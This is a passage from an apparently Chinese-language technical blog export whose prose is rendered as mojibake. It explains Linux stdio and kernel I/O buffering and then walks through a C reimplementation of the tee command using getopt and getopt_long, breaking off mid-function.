<h3 id="æ§åˆ¶stdioåº“çš„ç¼“å†²"><a href="#æ§åˆ¶stdioåº“çš„ç¼“å†²" class="headerlink" title="æ§åˆ¶stdioåº“çš„ç¼“å†²"></a>æ§åˆ¶stdioåº“çš„ç¼“å†²</h3><p>å¯¹äº<code>stdio</code>åº“åˆ†é…çš„ç¼“å†²åŒºï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ä¼šåˆ†é…<code>BUFSIZ</code>å¤§å°çš„ç¼“å†²åŒºï¼Œè¯¥å‚æ•°å€¼çš„å¤§å°è¯´æ³•ä¸ä¸€ï¼Œä½†æ®åŸæ–‡è¯´æ˜ï¼Œåœ¨<code>glibc</code>ä¸­å®šä¹‰ä¸º<code>8192</code>å­—èŠ‚ã€‚</p>
<p><code>stdio</code>æµçš„ç¼“å†²æ¨¡å¼åˆ†ä»¥ä¸‹ä¸‰ç±»ï¼š</p>
<ul>
<li><code>_IONBF</code> - ä¸ç¼“å†²</li>
<li><code>_IOLBF</code> - è¡Œç¼“å†²ï¼Œé’ˆå¯¹ç»ˆç«¯è®¾å¤‡ï¼Œåœ¨è¾“å‡ºä¸€ä¸ªæ¢è¡Œç¬¦å‰ç¼“å†²æ•°æ®ã€‚å¯¹è¾“å…¥æµï¼Œæ¯æ¬¡è¯»å–ä¸€è¡Œæ•°æ®</li>
<li><code>_IOFBF</code> - å…¨ç¼“å†²ï¼Œå•è¯è¯»ã€å†™æ•°æ®(read, write)çš„å¤§å°ä¸ç¼“å†²åŒºå¤§å°ä¸€è‡´ï¼Œç£ç›˜é»˜è®¤ä½¿ç”¨æ­¤æ¨¡å¼</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åº“å‡½æ•°<code>setvbuf</code>, <code>setbuffer</code>, <code>setbuf</code>ä¸‰è€…ä¹‹ä¸€è®¾ç½®<code>stdio</code>æµçš„ç¼“å†²æ¨¡å¼ã€‚</p>
<pre><code class="c">#include &lt;stdio.h&gt;
void setbuf(FILE *stream, char *buf);
void setbuffer(FILE *stream, char *buf, size_t size);
int setvbuf(FILE *stream, char *buf, int mode, size_t size);
</code></pre>
<p><code>setvbuf</code>å‡½æ•°ä¸­çš„modeå¯¹åº”çš„å°±æ˜¯ç¼“å†²æ¨¡å¼ï¼Œå¯é€‰é¡¹ä¸º<code>_IONBF</code>, <code>_IOLBF</code>, <code>_IOFBF</code>ï¼Œ<code>buf</code>å’Œ<code>size</code>åˆ†åˆ«å¯¹åº”æŒ‡å®šçš„ç¼“å†²åŒºæŒ‡é’ˆåŠç¼“å†²åŒºå¤§å°ã€‚å½“ç„¶ï¼Œå½“ä¸ºä¸ç¼“å†²æ¨¡å¼æ—¶ï¼Œå‡½æ•°å°†å¿½ç•¥<code>buf</code>ï¼Œ<code>size</code>è¿™ä¸¤ä¸ªå‚æ•°ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="c">#define BUF_SIZE 4096
static char buf[BUF_SIZE];
FILE *fp;

fp = fopen(&quot;test.txt&quot;, &#39;w&#39;);
if(setvbuf(fp, buf, _IOFBF, BUF_SIZE) !=0 )
    exit(EXIT_FAILURE);
</code></pre>
<p>ä»ä¸‹é¢çš„<code>uClibc</code>æºç å¯ä»¥çœ‹å‡ºï¼Œ<code>setbuffer</code>, <code>setbuf</code>ä»…ä»…æ˜¯å¯¹<code>setvbuf</code>çš„ç®€å•å°è£…ã€‚ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>SUSv3</code>æ ‡å‡†å¹¶æœªå¯¹<code>setbuffer</code>å‡½æ•°åŠ ä»¥å®šä¹‰ï¼Œåœ¨ä½¿ç”¨æ—¶éœ€è¦åŠ ä¸Šå®å®šä¹‰<code>_BSD_SOURCE</code>ã€‚</p>
<pre><code class="c">void setbuffer(FILE * __restrict stream, register char * __restrict buf, size_t size)
{
#ifdef __STDIO_BUFFERS
    setvbuf(stream, buf, (buf ? _IOFBF : _IONBF), size);
#endif
}

void setbuf(FILE * __restrict stream, register char * __restrict buf)
{
#ifdef __STDIO_BUFFERS
    setvbuf(stream, buf, ((buf != NULL) ? _IOFBF : _IONBF), BUFSIZ);
#endif
}
</code></pre>
<p>å¦‚æœæƒ³è¦ç¦ç”¨ç¼“å†²ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨<code>setbuf(stream, NULL)</code>å®ç°ã€‚ä½†é€šå¸¸ä¸æ¨èè¿™ä¹ˆåšï¼Œåº”è¯¥åˆç†ç»„ç»‡ä»£ç ï¼Œåœ¨ç‰¹å®šæƒ…å†µä½¿ç”¨<code>fflush</code>åˆ·æ–°æ•°æ®ï¼Œè¿™æ ·å¯ä»¥åœ¨æœ‰æ•ˆåˆ©ç”¨ç”¨æˆ·ç©ºé—´ç¼“å†²ä½œç”¨çš„åŒæ—¶ï¼Œå‡å°‘ç³»ç»Ÿè°ƒç”¨ï¼Œé€‚å®œçš„å­˜å‚¨æ•°æ®è‡³å†…æ ¸ç¼“å†²åŒºã€‚</p>
<h3 id="æ§åˆ¶æ–‡ä»¶I-Oçš„å†…æ ¸ç¼“å†²"><a href="#æ§åˆ¶æ–‡ä»¶I-Oçš„å†…æ ¸ç¼“å†²" class="headerlink" title="æ§åˆ¶æ–‡ä»¶I/Oçš„å†…æ ¸ç¼“å†²"></a>æ§åˆ¶æ–‡ä»¶I/Oçš„å†…æ ¸ç¼“å†²</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¼ºåˆ¶å°†å†…æ ¸ç¼“å†²åŒºå†…çš„æ•°æ®åˆ·æ–°è‡³ç£ç›˜ï¼Œè€Œä¸å¿…ç­‰å¾…å†…æ ¸çº¿ç¨‹ç­‰å¾…ç‰¹å®šæ—¶é—´åæ‰å†™å…¥ã€‚æ­¤æ—¶ä¸»è¦æœ‰ä¸¤ç§é€‰æ‹©</p>
<ol>
<li>ä½¿ç”¨<code>fsync</code>ï¼Œ<code>fdatasync</code>, <code>sync</code>ç³»ç»Ÿè°ƒç”¨ä¸­çš„æŸä¸€ä¸ªå°†å†…æ ¸ç¼“å†²åŒºçš„æ•°æ®å¼ºåˆ¶å†™å…¥ç£ç›˜</li>
<li>ä»¥<code>O_SYNC</code>åŒæ­¥æ–¹å¼è°ƒç”¨<code>open</code>æ‰“å¼€æ–‡ä»¶ï¼Œæ­¤åæ¯æ¬¡è¯»å†™æ“ä½œéƒ½ä¼šè‡ªåŠ¨ç«‹å³å†™å…¥ç£ç›˜</li>
</ol>
<h4 id="fsync"><a href="#fsync" class="headerlink" title="fsync"></a>fsync</h4><pre><code class="c">#include &lt;unistd.h&gt;
int fsync(int fd);
int fdatasync(int fd);
void sync(void);
</code></pre>
<p><code>fsync</code>ä¿è¯<strong>åŒæ­¥I/Oæ–‡ä»¶å®Œæ•´æ€§</strong>ï¼Œ<code>fdatasync</code>ä¿è¯<strong>åŒæ­¥I/Oæ•°æ®å®Œæ•´æ€§</strong>ã€‚ä¸¤ä¸ª<strong>å®Œæ•´æ€§</strong>çš„åŒºåˆ«åœ¨äºå‰è€…ä¼šå°†æ‰€æœ‰æ›´æ–°çš„æ–‡ä»¶å…ƒæ•°æ®å†™å…¥ç£ç›˜ï¼Œåè€…ä¸ä¼šä¼ é€’æ‰€æœ‰ç»è¿‡ä¿®æ”¹çš„æ–‡ä»¶å…ƒæ•°æ®å±æ€§ï¼ˆå¦‚ï¼šæ—¶é—´æˆ³ï¼‰ã€‚</p>
<p><code>fsync</code>ä¸<code>fdatasync</code>å‡æ˜¯åˆ·æ–°æŒ‡å®šæ–‡ä»¶æµæ•°æ®ï¼Œè€Œ<code>sync()</code>å‡½æ•°ä¼šæ›´æ–°æ‰€æœ‰å†…æ ¸ç¼“å†²åŒºæ•°æ®è‡³ç£ç›˜ï¼Œå¯¹åº”<code>shell</code>æŒ‡ä»¤<code>sync</code>ã€‚</p>
<h4 id="O-SYNC"><a href="#O-SYNC" class="headerlink" title="O_SYNC"></a>O_SYNC</h4><p><code>fsync</code>ç­‰ç³»ç»Ÿè°ƒç”¨éœ€è¦è¢«æ‰‹åŠ¨è°ƒç”¨ï¼Œä»…åœ¨è¢«è°ƒç”¨å¤„èµ·ä½œç”¨ï¼›è€Œä»¥<code>O_SYNC</code>æ–¹å¼<code>open</code>çš„æ–‡ä»¶æµï¼Œåç»­æ‰€æœ‰å†™æ“ä½œéƒ½å°†æŠŠæ•°æ®ç›´æ¥å†™å…¥ç£ç›˜ã€‚</p>
<p>ä¸åˆ°ä¸‡ä¸å¾—å·²è¿˜æ˜¯ä¸è¦ä»¥è¿™ç§æ–¹å¼æ‰“å¼€æ–‡ä»¶æµï¼Œå› ä¸ºè¿™å°†ä¸¥é‡å½±å“æ€§èƒ½ï¼Œå½“<code>write</code>ç¼“å†²åŒºè¾ƒå°æ—¶å°¤ä¸ºçªå‡ºã€‚</p>
<h3 id="ç¦ç”¨ç£ç›˜é«˜é€Ÿç¼“å­˜"><a href="#ç¦ç”¨ç£ç›˜é«˜é€Ÿç¼“å­˜" class="headerlink" title="ç¦ç”¨ç£ç›˜é«˜é€Ÿç¼“å­˜"></a>ç¦ç”¨ç£ç›˜é«˜é€Ÿç¼“å­˜</h3><p>æŒ‰ç…§ä¹¦ä¸Šæè¿°ï¼Œä½¿ç”¨<code>hdparm -W0</code>å¯ä»¥ç¦ç”¨ç£ç›˜ä¸Šçš„é«˜é€Ÿç¼“å­˜ï¼Œä½†æˆ‘æ²¡æœ‰å®é™…è¯•è¿‡ã€‚</p>
<h3 id="ç›´æ¥I-O"><a href="#ç›´æ¥I-O" class="headerlink" title="ç›´æ¥I/O"></a>ç›´æ¥I/O</h3><p>å½“ä»¥<code>O_DIRECT</code>æ–¹å¼<code>open</code>æ–‡ä»¶æµæ—¶ï¼Œæ•°æ®æµä¼šç»•è¿‡å†…æ ¸ç¼“å†²åŒºé«˜é€Ÿç¼“å­˜ï¼Œä»ç”¨æˆ·ç©ºé—´ç›´æ¥ä¼ å…¥æ–‡ä»¶æˆ–ç£ç›˜ï¼Œæ­¤ç±»è¿‡ç¨‹ç§°ä¸º<strong>ç›´æ¥I/O</strong>ã€‚</p>
<p>ä½¿ç”¨ç›´æ¥I/Oå¯¹I/Oæ“ä½œæœ‰è¯¸å¤šå¯¹é½é™åˆ¶ï¼Œä¸»è¦ä¿è¯è¯»å–å’Œå†™å…¥æ—¶ï¼Œåç§»é‡ã€æ•°æ®é•¿åº¦ä»¥åŠå†…å­˜è¾¹ç•Œéœ€è¦æ˜¯å—è®¾å¤‡åŸºæœ¬å•å…ƒ(é€šå¸¸ä¸º512å­—èŠ‚)çš„æ•´æ•°å€ï¼Œå¦åˆ™ä¼šå¯¼è‡´<code>EINVAL</code>é”™è¯¯ã€‚</p>
<p>ä½¿ç”¨ç›´æ¥I/Oæ—¶ï¼Œå¯ä»¥ç»“åˆ<code>memalign</code>å‡½æ•°åŠ¨æ€åˆ†é…å†…å­˜ã€‚</p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ä½¿ç”¨<code>stdio</code>åº“å‡½æ•°å¯ä»¥åˆ©ç”¨è¯¥åº“å®ç°çš„ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºå‡å°‘ç³»ç»Ÿè°ƒç”¨ï¼›<code>read</code>ï¼Œ<code>write</code>ç­‰ç³»ç»Ÿè°ƒç”¨é»˜è®¤ä¸ä¸ç£ç›˜ç›´æ¥ä¼ é€’æ•°æ®ï¼Œè€Œæ˜¯ç»è¿‡æ–‡ä»¶I/Oçš„å†…æ ¸ç¼“å†²åŒºä½œä¸ºä¸­è½¬ï¼Œä»¥æ­¤å‡å°‘ç£ç›˜æ“ä½œã€‚</p>
<p>é€šè¿‡<code>fflush</code>å‡½æ•°å¯ä»¥å°†<code>stdio</code>æµçš„ç¼“å†²åŒºæ•°æ®åˆ·æ–°è‡³å†…æ ¸ç¼“å†²åŒºï¼›é€šè¿‡<code>fsync</code>, <code>fdatasync</code>å‡½æ•°å¯ä»¥å°†å†…æ ¸ç¼“å†²åŒºæ•°æ®åˆ·æ–°è‡³ç£ç›˜ã€‚</p>
<p>ä½¿ç”¨<code>setvbuf</code>, <code>setbuf</code>ç­‰å‡½æ•°å¯ä»¥è®¾ç½®<code>stdio</code>æµçš„ç¼“å†²æ¨¡å¼ï¼Œç”šè‡³ç¦ç”¨ç¼“å†²ï¼›ä»¥<code>O_SYNC</code>æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¯ä»¥åœ¨ç«‹å³å°†æ•°æ®åŒæ­¥è‡³ç£ç›˜æ–‡ä»¶ã€‚</p>
<h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><ol>
<li>ã€ŠLinux/UNIXç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹ ç¬¬13ç«  æ–‡ä»¶I/Oç¼“å†²</li>
<li><a href="http://www.pixelbeat.org/programming/stdio_buffering/" target="_blank" rel="noopener">buffering in standard streams</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> stdio </tag>
            
            <tag> cache </tag>
            
            <tag> buffer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[LinuxæŒ‡ä»¤ - teeçš„å®ç°]]></title>
      <url>https://www.litreily.top/2018/09/27/tee/</url>
      <content type="html"><![CDATA[<p>è¿‘æ—¥å­¦ä¹ <a href="https://book.douban.com/subject/25809330/" target="_blank" rel="noopener">ã€ŠLinux/UNIX ç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹</a>ä¸€ä¹¦ï¼Œå·©å›ºäº†Cè¯­è¨€ä¸­ä¸€äº›å¸¸ç”¨åº“å‡½æ•°çš„ä½¿ç”¨ï¼Œä¸»è¦æ¶‰åŠåŸºæœ¬IOæ“ä½œç›¸å…³çš„åº“å‡½æ•°ã€‚ä¸ºäº†åŠ æ·±ç†è§£ï¼Œæ‰‹åŠ¨å®ç°äº†Linuxç³»ç»Ÿä¸­çš„<code>tee</code>æŒ‡ä»¤çš„åŠŸèƒ½ã€‚å€Ÿæ­¤æ–‡è®°è¿°å®ç°è¿‡ç¨‹ã€‚</p>
<h2 id="teeåŠŸèƒ½ç®€è¿°"><a href="#teeåŠŸèƒ½ç®€è¿°" class="headerlink" title="teeåŠŸèƒ½ç®€è¿°"></a>teeåŠŸèƒ½ç®€è¿°</h2><p><code>tee</code>ç±»ä¼¼äºä¸€ä¸ªå•è¾“å…¥åŒè¾“å‡ºçš„ä¸‰é€šç®¡é“ï¼Œå°†æ ‡å‡†è¾“å…¥çš„æ•°æ®è¾“å‡ºåˆ°æŒ‡å®šæ–‡ä»¶å’Œæ ‡å‡†è¾“å‡ºä¸­ã€‚ä¸ºå®ç°è¿™ä¸ªæŒ‡ä»¤ï¼Œä¸»è¦è€ƒè™‘ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>è§£æ<code>tee</code>åŒ…å«çš„å‘½ä»¤è¡Œå‚æ•°</li>
<li>è¯»å–æ ‡å‡†è¾“å…¥æ•°æ®ï¼Œå¹¶å°†æ•°æ®å†™å…¥æ ‡å‡†è¾“å‡ºå’ŒæŒ‡å®šæ–‡ä»¶</li>
<li>è‹¥æœªæŒ‡å®šæ–‡ä»¶ï¼Œåˆ™ä»…å°†æ•°æ®è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡º</li>
</ol>
<p>ä¸‹é¢é€æ­¥åˆ†ææ¯ä¸ªè¦ç‚¹çš„å®ç°æ–¹æ³•ã€‚</p>
<h2 id="å‚æ•°è§£æ"><a href="#å‚æ•°è§£æ" class="headerlink" title="å‚æ•°è§£æ"></a>å‚æ•°è§£æ</h2><p><code>tee</code>åŒ…å«ä»¥ä¸‹å¯é€‰é¡¹ï¼Œæœ¬æ–‡å®ç°ä»…è€ƒè™‘<code>-a</code>,<code>--version</code>,<code>--help</code></p>
<pre><code class="sh">Usage: tee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.

  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit
</code></pre>
<p>ä¸ºè§£æå‘½ä»¤è¡Œçš„<strong>å¯é€‰é¡¹</strong>ï¼Œéœ€è¦ç”¨åˆ°åº“å‡½æ•°<code>getopt</code>æˆ–<code>getopt_long</code>ï¼Œå‰è€…ä»…æ”¯æŒçŸ­æ ¼å¼ï¼Œåè€…æ”¯æŒé•¿çŸ­æ ¼å¼ã€‚ä¸‹é¢å¯¹ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°è§£æå‚æ•°çš„æ–¹æ³•è¿›è¡Œå¯¹æ¯”ã€‚</p>
<h3 id="getopt"><a href="#getopt" class="headerlink" title="getopt"></a>getopt</h3><p><code>getopt</code>å‡½æ•°å£°æ˜åŠç›¸å…³å‚æ•°å¦‚ä¸‹ï¼š</p>
<pre><code class="c">#include &lt;unistd.h&gt;

int getopt(int argc, char * const argv[],
            const char *optstring);

extern char *optarg;
extern int optind, opterr, optopt;
</code></pre>
<ul>
<li><code>argc</code>: ä¸mainå‡½æ•°çš„argcä¸€è‡´ï¼Œä»£è¡¨å‚æ•°ä¸ªæ•°</li>
<li><code>argv</code>: ä¸mainå‡½æ•°çš„argvä¸€è‡´ï¼Œä»£è¡¨å‚æ•°å€¼</li>
<li><code>optstring</code>: å¯é€‰é¡¹å­—ç¬¦ä¸²ï¼Œå¦‚<code>a:bc:d:</code>ï¼Œå‚æ•°åå¸¦å†’å·ä»£è¡¨è¯¥é€‰é¡¹éœ€è¦ç»™å®šå‚æ•°å€¼</li>
<li><code>optarg</code>: å­˜å‚¨å¯é€‰é¡¹çš„å‚æ•°å€¼ï¼Œå¦‚æœä¸å¸¦å‚æ•°åˆ™ä¸ºNULL</li>
<li><code>optind</code>: å­˜å‚¨ä¸‹ä¸€ä¸ªå¯é€‰å‚æ•°çš„ç´¢å¼•ï¼Œæ¯æ‰§è¡Œä¸€æ¬¡<code>getopt</code>å°±åŠ 1</li>
<li><code>opterr</code>: é”™è¯¯æç¤ºæ ‡å¿—ï¼Œé»˜è®¤ä¸º1ï¼Œå½“è¾“å…¥å‚æ•°æ— æ•ˆæ—¶ï¼Œä¼šç»™å‡ºæç¤º</li>
<li><code>optopt</code>: æ˜¯å¯¹å¯é€‰å‚æ•°å­—ç¬¦çš„ä¸€ä¸ªå¤‡ä»½ï¼Œå½“è¾“å…¥çš„å‚æ•°æ— æ•ˆæ—¶å¯ç”¨</li>
</ul>
<p>ä¸‹é¢ä½¿ç”¨<code>getopt</code>å®ç°å¯¹é€‰é¡¹<code>-a</code>çš„è§£æï¼š</p>
<pre><code class="c">int main(int argc, char *argv[])
{
    int opt, fd = -1;
    int flag_append = 0;
    int flags = O_WRONLY | O_CREAT;

    while((opt = getopt(argc, argv, &quot;a&quot;))!=-1) {
        switch(opt){
            case &#39;a&#39;:
                flag_append = 1;
                break;
            case &#39;?&#39;:
            default:
                exit(EXIT_FAILURE);
                break;
        }
    }

    if(optind &lt; argc){
        flags += flag_append ? O_APPEND:O_TRUNC;
        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR
                    | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(fd == -1){
            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);
            exit(EXIT_FAILURE);
        }
    }

    output(fd);
    if(fd &gt; 0)
        close(fd);

    return 0;
}
</code></pre>
<p>ä»¥ä¸Šä»£ç ç»“åˆ<code>while</code>ã€ <code>switch</code>ï¼Œä½¿ç”¨<code>getopt</code>å¾ªç¯è·å–å’Œåˆ†æå¯é€‰é¡¹ã€‚å½“å‰åªå¯¹ä¸€ä¸ªå¯é€‰é¡¹<code>a</code>è¿›è¡Œäº†è§£æï¼Œå½“åŒ…å«<code>-a</code>å¯é€‰é¡¹æ—¶ï¼Œflag_appendè®¾ä¸º1ï¼Œä¹‹åæ ¹æ®è¯¥æ ‡å¿—ä¸ºæ–‡ä»¶çš„æ‰“å¼€æ–¹å¼æ·»åŠ <code>O_APPEND</code>æ ‡å¿—ï¼Œåé¢è¯»å†™æ•°æ®æ—¶å°±ä¼šä»¥é™„åŠ çš„æ–¹å¼åœ¨æ–‡ä»¶å°¾éƒ¨å¼€å§‹å†™å…¥ã€‚</p>
<pre><code class="c">    if(optind &lt; argc){
        flags += flag_append ? O_APPEND:O_TRUNC;
        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR
                | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        //...
</code></pre>
<p>è¯´æ˜ï¼š  </p>
<ol>
<li>å¦‚æœä¸å¸¦<code>-a</code>ï¼Œç¨‹åºé»˜è®¤ä¼šä»¥<code>O_TRUNC</code>æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œè¡¨ç¤ºæˆªæ–­ï¼Œä¼šä»¥é‡å†™çš„æ–¹å¼è¦†ç›–åŸæ–‡ä»¶ï¼›</li>
<li><code>optind</code>å°äº<code>argc</code>æ—¶ï¼Œè¯´æ˜é™¤äº†å¯é€‰å‚æ•°ä¹‹å¤–ï¼Œç”¨æˆ·è¿˜è¾“å…¥äº†å…¶å®ƒå‚æ•°ï¼Œè¿™é‡Œå¯¹åº”çš„æ˜¯<code>tee</code>æŒ‡ä»¤æ‰€éœ€çš„æ–‡ä»¶åç§°ã€‚æ­¤æ—¶argv[optind]åˆšå¥½å¯¹åº”ç¬¬ä¸€ä¸ªéå¯é€‰å‚æ•°ã€‚</li>
</ol>
<h3 id="getopt-long"><a href="#getopt-long" class="headerlink" title="getopt_long"></a>getopt_long</h3><p><code>getopt_long</code>å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="c">#include &lt;getopt.h&gt;

int getopt_long(int argc, char * const argv[],
            const char *optstring,
            const struct option *longopts, int *longindex);
</code></pre>
<p>ä¸<code>getopt</code>ç›¸æ¯”ï¼Œå¤šäº†ä¸¤ä¸ªå‚æ•°<code>longopts</code>, <code>longindex</code></p>
<ul>
<li><code>longopts</code>: é•¿æ ¼å¼å¯é€‰é¡¹ï¼Œ<code>option</code>ç»“æ„ä½“æŒ‡é’ˆ</li>
</ul>
<pre><code class="c">struct option {
    const char *name;       // åç§°ï¼Œå¦‚&quot;help&quot;
    int         has_arg;    // å¸¦å‚æ ‡å¿—ï¼Œ0 æˆ– 1
    int        *flag;       // å¸¸è®¾ä¸ºNULLï¼Œè‹¥éNULL,å°†ä¼šæŠŠvalå€¼å­˜å…¥flag
    int         val;        // getopt_longçš„è¿”å›å€¼æˆ–å°†å­˜å…¥flagçš„å€¼
};
</code></pre>
<p>å½“<code>flag</code>ä¸ºNULLæ—¶ï¼Œ<code>getopt_long</code>è¿”å›<code>val</code>ï¼Œå¦åˆ™è¿”å›0,å¹¶å°†<code>val</code>å€¼å­˜å…¥<code>flag</code></p>
<ul>
<li><code>longindex</code>: ç”¨äºå­˜å‚¨å½“å‰è§£æçš„é•¿é€‰é¡¹åœ¨<code>longopts</code>ä¸­çš„ç´¢å¼•å€¼(0,1,...)ï¼Œé€šå¸¸è®¾ä¸º<code>NULL</code></li>
</ul>
<p>ä¸‹é¢ä½¿ç”¨<code>getopt_long</code>å®ç°å¯¹é€‰é¡¹<code>--help</code>ï¼Œ<code>--version</code>, <code>-a</code>çš„è§£æï¼š</p>
<pre><code class="c">int main(int argc, char *argv[])
{
    int opt, fd = -1;
    int flag_append = 0;
    int flags = O_WRONLY | O_CREAT;

    struct option opts[] = {
        {&quot;append&quot;, 0, NULL, &#39;a&#39;},
        {&quot;help&quot;, 0, NULL, &#39;h&#39;},
        {&quot;version&quot;, 0, NULL, &#39;v&#39;}
    };

    while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1) {
        switch(opt){
            case &#39;a&#39;:
                flag_append = 1;
                break;
            case &#39;h&#39;:
                usage();
                break;
            case &#39;v&#39;:
                printf(VERSION&quot;\n&quot;);
                exit(EXIT_FAILURE);
                break;
            case &#39;?&#39;:
                printf(&quot;tee: invaild option -- &#39;%c&#39;\n&quot;
                    &quot;Try &#39;tee --help&#39; for more infomation.\n&quot;, optopt);
            default:
                exit(EXIT_FAILURE);
                break;
        }
    }

    if(optind &lt; argc){
        flags += flag_append ? O_APPEND:O_TRUNC;
        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR
            | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(fd == -1){
            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);
            exit(EXIT_FAILURE);
        }
    }

    output(fd);
    if(fd &gt; 0)
        close(fd);

    return 0;
}
</code></pre>
<p>ä»¥ä¸Šä»£ç ä¸­ï¼Œé•¿æ ¼å¼é€‰é¡¹æ•°ç»„å¦‚ä¸‹ï¼š</p>
<pre><code class="c">    struct option opts[] = {
        {&quot;append&quot;, 0, NULL, &#39;a&#39;},
        {&quot;help&quot;, 0, NULL, &#39;h&#39;},
        {&quot;version&quot;, 0, NULL, &#39;v&#39;}
    };
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå½“ç”¨æˆ·åˆ†åˆ«è¾“å…¥<code>--append</code>,<code>--help</code>,<code>--version</code>æ—¶ï¼Œ<code>getopt_long</code>åˆ†åˆ«è¿”å›<code>a</code>ï¼Œ<code>h</code>ï¼Œ<code>v</code>ä¸‰ä¸ªå­—ç¬¦ã€‚</p>
<p>ä½†æ³¨æ„<code>while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1)</code>åªåŒ…å«äº†<code>av</code>ä¸¤ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å½“ç”¨æˆ·è¾“å…¥<code>-h</code>æ—¶ï¼Œç¨‹åºä¼šè®¤ä¸ºæ˜¯æ— æ•ˆå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´<code>--help</code>åœ¨è¿™é‡Œåªæ”¯æŒé•¿æ ¼å¼ï¼Œè€Œå…¶å®ƒä¸¤ä¸ªæ”¯æŒé•¿çŸ­ä¸¤ç§æ–¹å¼ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯æŒ‡ä»¤çš„æŸäº›é€‰é¡¹ä»…æ”¯æŒé•¿æ ¼å¼çš„å®ç°æ–¹æ³•ä¹‹ä¸€äº†ï¼Œå…¶å®ƒæ–¹æ³•å¯å‚è€ƒå‡½æ•°<code>getopt_long_only</code></p>
<blockquote>
<p>è¯´æ˜ï¼š<br><code>:av</code>æœ€å‰é¢çš„å†’å·å¯ä»¥èµ·åˆ°<code>opterr=0</code>çš„æ•ˆæœï¼Œå°±æ˜¯åœ¨å‚æ•°æ— æ•ˆæ—¶ä¸ç»™å‡ºé»˜è®¤æç¤º</p>
</blockquote>
<h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><a href="#getopt_long">getopt_long</a>æåˆ°çš„<code>--help</code>é€‰é¡¹æ˜¯ç»å¤§å¤šæ•°æŒ‡ä»¤éƒ½ä¼šå®ç°çš„ï¼Œç”¨äºæä¾›å¸®åŠ©ä¿¡æ¯ï¼Œä¸‹é¢æ˜¯<code>tee</code>çš„<code>--help</code>è¾“å‡ºã€‚</p>
<pre><code class="c">void usage(){
    printf(&quot;Usage: tee [OPTION]... [FILE]\n&quot;
        &quot;Copy standard input to each FILE, and also to standard output.\n\n&quot;
        &quot;  -a, --append   append to the given FILEs, do not overwrite\n&quot;
        &quot;  -v, --version  output version information and exit\n&quot;
        &quot;      --help     display this help and exit\n&quot;
    );
    exit(EXIT_FAILURE);
}
</code></pre>
<h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>å…³äºå‚æ•°è§£æï¼Œè¯´åˆ°åº•å°±æ˜¯<code>getopt</code>æˆ–<code>getopt_long</code>çš„åº”ç”¨ã€‚ä»¥ä¸Šæåˆ°çš„å¯é€‰å‚æ•°ä¸­ï¼Œå…¶å®ä¹Ÿå°±<code>-a</code>ä¼šå½±å“åç»­å†™å…¥æ–‡ä»¶çš„æ–¹å¼ï¼Œå…¶å®ƒä¸¤ä¸ªé•¿æ ¼å¼é€‰é¡¹å‡ç”¨äºæ‰“å°ä¿¡æ¯ï¼Œä¹‹åä¾¿ç›´æ¥é€€å‡ºäº†ã€‚</p>
<p>è€Œéå¯é€‰é¡¹ä¹Ÿåªè€ƒè™‘äº†ä¸€ä¸ªå¾…å†™å…¥æ–‡ä»¶çš„æ–‡ä»¶åï¼Œæš‚ä¸è€ƒè™‘åŒæ—¶å¤šæ–‡ä»¶å†™å…¥ã€‚</p>
<h2 id="æ•°æ®è¯»å†™"><a href="#æ•°æ®è¯»å†™" class="headerlink" title="æ•°æ®è¯»å†™"></a>æ•°æ®è¯»å†™</h2><p><code>tee</code>æ•°æ®è¯»å†™å¾ˆç®€å•ï¼Œä»…éœ€ä¸æ–­è¯»å–æ ‡å‡†è¾“å…¥(stdin)æ•°æ®ï¼Œç„¶åå†™å…¥æ ‡å‡†è¾“å‡º(stdout)å’Œæ–‡ä»¶ä¸­ï¼Œç›´åˆ°æ— æ•°æ®å¯è¯»æˆ–é‡åˆ°ä¸­æ–­ä¿¡å·ä¸ºæ­¢ã€‚</p>
<pre><code class="c">#define BUF_SIZE 512
void output(int fd)
{
    int i = 0;
